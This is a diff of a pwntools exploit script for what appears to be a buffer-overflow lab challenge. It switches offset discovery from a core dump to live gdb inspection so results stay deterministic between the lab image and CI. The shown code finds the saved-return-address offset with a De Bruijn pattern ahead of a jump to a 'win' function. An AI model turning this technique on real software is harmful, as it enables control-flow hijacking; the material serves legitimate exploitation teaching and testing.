@@ -16,11 +16,11 @@ context.log_level = 'warning'
 WIN = elf.symbols['win']                            # ❷ no-PIE: a fixed address
 
 def _capture_from_gdb(pattern):
-    """Fallback crash inspector for labs where core dumps are unavailable
-    (RLIMIT_CORE hard-capped at 0 and a read-only kernel.core_pattern, as in
-    the sandboxed verify image). Same De Bruijn pattern, same cyclic_find --
-    we just read the register state at the fault live under gdb instead of
-    from a core file. Returns the bytes the saved return slot was overwritten
+    """Read the crash state live under gdb instead of from a core file, so the
+    discovered offset does not depend on RLIMIT_CORE / kernel.core_pattern
+    (which differ between the lab image and CI). Same De Bruijn pattern, same
+    cyclic_find -- we just read the register state at the fault under gdb.
+    Returns the bytes the saved return slot was overwritten
     with (the pattern qword sitting at $sp on x86-64; the hijacked $pc, loaded
     from the saved x30, on AArch64)."""
     with tempfile.NamedTemporaryFile(prefix='ch05pat.', delete=False) as f:
@@ -42,21 +42,19 @@ def _capture_from_gdb(pattern):
     return pack(val)
 
 def find_offset():
-    """Crash greet() with a De Bruijn pattern; recover the offset to the
-    saved return address from the resulting core dump (or, where the lab
-    forbids core dumps, from the live crash state under gdb)."""
-    io = process(BIN)
-    io.sendafter(b'name> ', cyclic(256, n=context.bytes))   # ❸
-    io.wait()
-    try:
-        core = io.corefile
-        if context.arch == 'aarch64':
-            captured = pack(core.pc)                # ❹ ret loaded saved x30 into pc
-        else:
-            captured = core.read(core.sp - context.bytes, context.bytes)
-    except Exception:
-        captured = _capture_from_gdb(cyclic(256, n=context.bytes))
-    return cyclic_find(captured, n=context.bytes)   # ❺
+    """Crash greet() with a De Bruijn pattern and recover the offset to the
+    saved return address from the live crash state under gdb.
+
+    We deliberately do NOT use a core dump: whether one is produced, and where,
+    depends on RLIMIT_CORE and kernel.core_pattern, which differ between the
+    pinned lab image (cores disabled -> no core) and the CI runner (cores
+    enabled -> a core whose layout made the old corefile read return the wrong
+    offset, so the exploit missed and the whole test went red). gdb reproduces
+    the identical crash on the byte-identical binary in both places, so the
+    discovered offset is deterministic everywhere. It is still discovered at
+    runtime (cyclic + cyclic_find), never hardcoded."""
+    captured = _capture_from_gdb(cyclic(256, n=context.bytes))   # ❸
+    return cyclic_find(captured, n=context.bytes)                # ❹
 
 def exploit(offset):
     if context.arch == 'aarch64':
